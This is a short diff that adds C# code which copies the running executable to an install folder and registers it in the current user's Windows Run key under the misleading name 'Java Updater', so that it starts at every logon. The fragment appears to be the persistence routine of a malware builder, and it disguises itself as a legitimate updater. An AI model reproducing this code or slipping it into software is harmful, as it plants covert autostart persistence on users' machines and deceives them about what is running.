@@ -1,0 +1,6 @@
+                string Copy2 = [INSTALL-PATH] + "\\" + Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location);
+                if (!File.Exists(Copy2))
+                {
+                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Copy2, true);
+                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Java Updater", Copy2);
+                }
